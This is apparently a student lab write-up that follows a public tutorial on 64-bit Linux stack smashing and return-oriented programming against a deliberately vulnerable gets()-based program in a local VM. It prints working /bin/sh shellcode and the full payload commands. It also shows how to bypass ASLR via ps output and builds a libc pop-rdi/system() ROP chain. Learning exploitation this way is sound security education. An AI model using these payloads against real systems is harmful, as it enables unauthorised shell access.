# 64-bit Linux Return-Oriented Programming (CSc 480-project2)
## Christopher Yang
Followed tutorial found at: http://crypto.stanford.edu/~blynn/rop/

### My environment
I am running on Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64) via Vagrant.

### The shell game
syscall - programmatic way in which a program can request a service from the kernel of the OS.

kernel - connects application software to the hardware of a computer

#### shell.c
```
int main() {
  asm("\
needle0: jmp there\n\
here:    pop %rdi\n\
         xor %rax, %rax\n\
         movb $0x3b, %al\n\
         xor %rsi, %rsi\n\
         xor %rdx, %rdx\n\
         syscall\n\
there:   call here\n\
.string \"/bin/sh\"\n\
needle1: .octa 0xdeadbeef\n\
  ");
}
```

##### Procedure of shell.c
1. In needle0: Jump there
2. Call here
3. Return to .string and execute /bin/sh
4. Then run in needle1 .octa 0xdeadbeef

References from: https://www.cs.rutgers.edu/~pxk/416/notes/c-tutorials/exec.html

execve - runs the shell command in the string and then the main's function gets run

Display disassemble info from needle0 to needle1
```
$ objdump -d a.out | sed -n '/needle0/,/needle1/p'
00000000004004f1 <needle0>:
  4004f1:	eb 0e                	jmp    400501 <there>

00000000004004f3 <here>:
  4004f3:	5f                   	pop    %rdi
  4004f4:	48 31 c0             	xor    %rax,%rax
  4004f7:	b0 3b                	mov    $0x3b,%al
  4004f9:	48 31 f6             	xor    %rsi,%rsi
  4004fc:	48 31 d2             	xor    %rdx,%rdx
  4004ff:	0f 05                	syscall

0000000000400501 <there>:
  400501:	e8 ed ff ff ff       	callq  4004f3 <here>
  400506:	2f                   	(bad)
  400507:	62                   	(bad)
  400508:	69 6e 2f 73 68 00 ef 	imul   $0xef006873,0x2f(%rsi),%ebp

000000000040050e <needle1>:
```

Plain hexdump style beginning with 0x4bf (offset from 0x400000) and print the first 32 bytes
```
xxd -s0x4bf -l32 -p a.out shellcode
```

Since my program begins at address 0x4f1, I run
```
xxd -s0x4f1 -l32 -p a.out shellcode
```

This prints out the instructions of the program (length = 30 bytes) with extra 2 bytes at the end
```
$ cat shellcode
eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
bead
```


#### victim.c
```
#include <stdio.h>
int main() {
  char name[64];
  puts("What's your name?");
  gets(name);
  printf("Hello, %s!\n", name);
  return 0;
}
```

victim.c is a buffer overflow example, since given a large enough input, char name[64] will be overflowed and will overwrite return address of main.


The two errors encountered were:
1.
```
*** stack smashing detected ***: ./victim terminated
Aborted (core dumped)
```

    * gcc detected a buffer overflow in the local variables
    * also known as GCC Stack-Smashing Protector (SSP)

2.
```
Segmentation fault (core dumped)
```
    * for a larger input, the return address is not accessible because it has been overwritten with an invalid address
    * Executable space protection (NX)
        * Never execute

Found difference between stack smashing detected and seg fault here: http://stackoverflow.com/questions/35169877/the-difference-between-segment-fault-and-stack-smashing-detected


Reference to return address in memory stack:
![Memory stack](http://i.imgur.com/BZvNseJ.png)


### The Three Trials of Code Injection
**Stack smashing protector (SSP)** - inserts runtime stack integrity checks for buffer overflows

**Executable space protection (NX)** - executing code from stack -> seg fault

**Address space layout randomization (ASLR)** - location of the stack is randomized every time. Prevents others from overwriting the return address because they wouldn't know where to point back to.

We need to print out the address of buffer name[]

#### victim.c
```
#include <stdio.h>
int main() {
  char name[64];
  printf("%p\n", name);  // Print address of buffer.
  puts("What's your name?");
  gets(name);
  printf("Hello, %s!\n", name);
  return 0;
}
```

We will now recompile the program and remove the security constraints (SSP, NX, and ASLR)
```
$ gcc -fno-stack-protector -o victim victim.c
$ execstack -s victim
$ setarch `arch` -R ./victim
```

Print the hexadecimal number as unsigned with minimum 16 digits and write output to $a in little endian
```
vagrant@vagrant-ubuntu-trusty-64:/vagrant$ a=`printf %016x 0x7fffffffe400 | tac -rs..`
vagrant@vagrant-ubuntu-trusty-64:/vagrant$ echo $a
00e4ffffff7f0000
```

From below, we know that shellcode takes up 32 bytes and that printing 80 zeroes will be 40 bytes since each 2 zeroes are 1 byte.
64 of those bytes will fill up name[]. The remaining 8 will overwrite the location at RBP register. That means the stack base pointer begins at 0x0 (Note that this just used as filler to get to the location of return address).

The last 8 should overwrite the return address, such that it will be the address of the beginning of the buffer of name[]. Since in name[] we have the binary executable of /bin/sh/, the program will execute /bin/sh/. No prompt is given since the input is actually provided by cat and not the terminal.

```
vagrant@vagrant-ubuntu-trusty-64:/vagrant$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ;
> cat ) | setarch `arch` -R ./victim
0x7fffffffe400
What's your name?
world
Hello, �_H1��;H1�H1������/bin/sh!
ls
Vagrantfile  hellcode ; printf -080d 0 ; echo $a ) | xxd -r -p ;  shell  shell.c  shell.dSYM  shellcode  victim  victim.c
ls
Vagrantfile  hellcode ; printf -080d 0 ; echo $a ) | xxd -r -p ;  shell  shell.c  shell.dSYM  shellcode  victim  victim.c
pwd
/vagrant
```

Let's dissect the entire command into parts:

```
$ cat shellcode ; printf %080d 0 ; echo $a
eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
bead
0000000000000000000000000000000000000000000000000000000000000000000000000000000000e4ffffff7f0000
```

Convert hexdump into binary with reverse flag -r. In other words, we are reversing the process of what we did for shellcode and getting the executable of shellcode. Cat will echo back any input you give.
```
vagrant@vagrant-ubuntu-trusty-64:/vagrant$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat )
 �_H1��;H1�H1������/bin/sh!����helloworld
helloworld
```

name[64] should contain  ```�_H1��;H1�H1������/bin/sh!����000000000000000000000000000000000000000000000000000000000000000000```

the overwritten RBP is 0000000000000000

the return address is pointed to the beginning of name[64] at 0x00e4ffffff7f0000

### The Importance of Being Patched
Display the cmd, esp for all processes
```
CMD                              ESP
/sbin/init                  00000000
[kthreadd]                  00000000
[ksoftirqd/0]               00000000
[kworker/0:0]               00000000
[kworker/0:0H]              00000000
[rcu_sched]                 00000000
[rcuos/0]                   00000000
[rcu_bh]                    00000000
[rcuob/0]                   00000000
[migration/0]               00000000
[watchdog/0]                00000000
[khelper]                   00000000
[kdevtmpfs]                 00000000
[netns]                     00000000
[writeback]                 00000000
[kintegrityd]               00000000
[bioset]                    00000000
[kworker/u3:0]              00000000
[kblockd]                   00000000
[ata_sff]                   00000000
[khubd]                     00000000
[md]                        00000000
[devfreq_wq]                00000000
[kworker/0:1]               00000000
[khungtaskd]                00000000
[kswapd0]                   00000000
[vmstat]                    00000000
[ksmd]                      00000000
[fsnotify_mark]             00000000
[ecryptfs-kthrea]           00000000
[crypto]                    00000000
[kthrotld]                  00000000
[deferwq]                   00000000
[charger_manager]           00000000
[kpsmoused]                 00000000
[scsi_eh_0]                 00000000
[kworker/u2:2]              00000000
[kworker/u2:3]              00000000
[kworker/u3:1]              00000000
[jbd2/sda1-8]               00000000
[ext4-rsv-conver]           00000000
upstart-udev-bridge --daemo 00000000
/lib/systemd/systemd-udevd  00000000
[iprt]                      00000000
upstart-socket-bridge --dae 00000000
rpcbind                     00000000
rpc.statd -L                00000000
dhclient -1 -v -pf /run/dhc 00000000
[rpciod]                    00000000
[nfsiod]                    00000000
upstart-file-bridge --daemo 00000000
rpc.idmapd                  00000000
rsyslogd                    00000000
dbus-daemon --system --fork 00000000
/lib/systemd/systemd-logind 00000000
runsvdir -P /etc/service lo 00000000
/sbin/getty -8 38400 tty4   00000000
/sbin/getty -8 38400 tty5   00000000
runsv git-daemon            00000000
/sbin/getty -8 38400 tty2   00000000
/sbin/getty -8 38400 tty3   00000000
/sbin/getty -8 38400 tty6   00000000
svlogd -tt /var/log/git-dae 00000000
/usr/lib/git-core/git-daemo 00000000
/usr/sbin/sshd -D           00000000
acpid -c /etc/acpi/events - 00000000
atd                         00000000
cron                        00000000
/usr/sbin/VBoxService       00000000
[kauditd]                   00000000
/usr/bin/ruby /usr/bin/pupp 00000000
/usr/sbin/apache2 -k start  00000000
/usr/sbin/apache2 -k start  00000000
/usr/sbin/apache2 -k start  00000000
ruby /usr/bin/chef-client - 00000000
/sbin/getty -8 38400 tty1   00000000
sshd: vagrant [priv]        00000000
sshd: vagrant@pts/0         00000000
-bash                       bf3d81e8
ps -eo cmd,esp              999eac98
```

Check the process of victim and its ESP without ASLR
```
vagrant@vagrant-ubuntu-trusty-64:~$ ps -o cmd,esp -C victim
CMD                              ESP
./victim                    ffffe398
```

Offset for the ESP and the address of name[] is 88
```
vagrant@vagrant-ubuntu-trusty-64:~$ echo $((0x7fffffe3f0-0x7fffffe398))
88
```

With ASLR reenabled, ESP = 0x1d4f5d88

Now with the added offset of 88 to the ESP, we know exactly where the start of name[] is in relation to ESP.
```
vagrant@vagrant-ubuntu-trusty-64:~$ printf %x\\n $((0x7fff1d4f5d88+88))
7fff1d4f5de0
```

Next we will create a pipe FIFO file that will be used to read as input for victim.

In one terminal:
```
vagrant@precise64:~/480-project2$ cat pip | ./victim
0x7fff8c351d20
What's your name?
Hello, �_H1��;H1�H1������/bin/sh!
pip  shell  shell.c  shell.dSYM  shellcode  victim  victim.c
```

The input is updated in another terminal.

We are finding the beginning of name buffer with the ESP and offset we found earlier. This is then used to access the shell similar to what we did previously.

After pressing enter a few times, name buffer is filled with the binary for shellcode and running 'ls', we see that in the other terminal we were able to get a list of files/folders.
```
vagrant@precise64:~/480-project2$ sp=`ps --no-header -C victim -o esp`
vagrant@precise64:~/480-project2$ a=`printf %016x $((0x7fff$sp+88)) | tac -r -s..`
vagrant@precise64:~/480-project2$ echo $a
201d358cff7f0000
vagrant@precise64:~/480-project2$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) > pip


ls
```

### Executable space perversion
Trying the same procedure as above causes a segmentation fault with NX on.

In first terminal:
```
vagrant@precise64:~/480-project2$ cat pip | ./victim
0x7fffa61c3540
What's your name?
Hello, �_H1��;H1�H1������/bin/sh!
Segmentation fault
```

In second terminal:
```
vagrant@precise64:~/480-project2$ sp=`ps --no-header -C victim -o esp`
vagrant@precise64:~/480-project2$ a=`printf %016x $((0x7fff$sp+88)) | tac -r -s..`
vagrant@precise64:~/480-project2$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) > pip
```

We overcame ASLR, but not NX. This is because we are trying to overwrite name buffer and execute the code within the buffer. To rectify the problem, we will use return-oriented programming, which allows us to fill the buffer instead with addresses that point to the location of the executable code.

In essence, we override the meaning of RET because the stack pointer will now be jumping to the a memory location held where instructions will be processed. SP is then incremented by 8 as usual, but these will be new instructions from RET. When these instructions encounter RET again, the process is repeated until finally the program ends.

These instructions ending with RET are called gadgets.

### Go go gadgets
We begin by trying to call the system() function from libc with "/bin/sh" as the argument.

Locate libc:
```
vagrant@precise64:~/480-project2$ locate libc.so
/lib/x86_64-linux-gnu/libc.so.6
```

Display disassemble information from the libc and only show the first 5 lines before 'ret' and separate results by --
```
vagrant@precise64:~/480-project2$ objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 ret
```

This prints out way too much information and we only want to know the gadget that allows us to assign a value to RDI and then call RET to jump to the libc system() function. The value at the top of stack should be a pointer to the address of "/bin/sh" so that when we pop, we are able to assign that to RDI.

Maybe along the lines of:
```
pop  %rdi
retq
```

We settle for a solution that uses regex:
```
vagrant@precise64:~/480-project2$ xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 |
> grep 5f -m1 | awk '{printf"%x\n",$1-1}'
22a12
```

In layman terms, we look for c3, which is the opcode for retq, and 5f, the address of register RDI. Given that we found the correct instructions, we calculate the offset to be 0x22a12.

Finally, we should be able to calculate the location of the gadget, the beginning of buffer for "/bin/sh", and system() libc function.

In one terminal, we check the beginning of the buffer:
```
vagrant@precise64:~/480-project2$ setarch `arch` -R ./victim
0x7fffffffe5c0
What's your name?
```

While this is running, we check the process of where libc is loaded;
```
vagrant@precise64:~/480-project2$ pid=`ps -C victim -o pid --no-headers | tr -d ' '`
vagrant@precise64:~/480-project2$ grep libc /proc/$pid/maps
7ffff7a1d000-7ffff7bd0000 r-xp 00000000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
7ffff7bd0000-7ffff7dcf000 ---p 001b3000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
7ffff7dcf000-7ffff7dd3000 r--p 001b2000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
7ffff7dd3000-7ffff7dd5000 rw-p 001b6000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
```

And the offset for libc is:
```
vagrant@precise64:~/480-project2$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
0000000000044320 W system
```

Finally, we modify the hexdump to perform the attack, which occurs when the instruction pointer is at the main() return. Beginning at the main() return location, we will have (0x7ffff7a1d000+0x22a12), followed by 0x7fffffffe5c0, and (0x7ffff7a1d000+0x44320).

Note that the first 130 zeroes equate to 65 bytes which is just enough to fill the rest of the name buffer after "/bin/sh" and the RBP register. Then the return address is hijacked to point to the gadget of pop RDI and RET. Instruction pointer will jump to (0x7ffff7a1d000+0x22a12) and RSP is incremented to the location after the return address location with value 0x7fffffffe5c0.

When the instruction pointer reaches pop RDI in the gadget, RDI will store the value at the RSP, which will be the address of "/bin/sh" (0x7fffffffe5c0). We to increment RSP so that it contains the value of (0x7ffff7a1d000+0x44320).
 
When the instruction pointer reaches the RET in the gadget, the instruction pointer jumps to where the RSP is (0x7ffff7a1d000+0x44320). Remember that the value at RSP is the location of the system() libc function, so the instruction pointer will jump to there and call it using RDI as a parameter ("/bin/sh"). 
```
vagrant@precise64:~/480-project2$ (echo -n /bin/sh | xxd -p; printf %0130d 0; printf %016x $((0x7ffff7a1d000+0x22a12)) | tac -rs..; printf %016x 0x7fffffffe5c0 | tac -rs..; printf %016x $((0x7ffff7a1d000+0x44320)) | tac -rs..) | xxd -r -p | setarch `arch` -R ./victim
0x7fffffffe5c0
What's your name?
Hello, /bin/sh!



ls
pip  shell  shell.c  shellcode  shell.dSYM  victim  victim.c
```


This video explains the example very nicely except call stack address should be flipped as the ESP is incremented when popping: https://youtu.be/XZa0Yu6i_ew?t=183

### Conclusion
Despite various security measures placed by the compiler to prevent buffer overflows, we were still able to pull off the attack using return-oriented programming.
